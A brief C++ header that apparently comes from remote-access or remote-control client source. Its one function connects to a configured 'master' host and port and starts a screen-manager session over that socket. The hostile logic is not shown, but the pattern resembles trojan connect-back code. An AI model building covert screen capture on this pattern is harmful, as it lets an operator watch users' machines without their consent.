#pragma once
#include "ScreenManager.h"

DWORD WINAPI Loop_ScreenManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.InitSocket(CBaseManager::m_strMasterHost, CBaseManager::m_nMasterPort))
		return -1;

	CScreenManager	manager(&socketClient);

	socketClient.RunEventLoop();
	return 0;
}
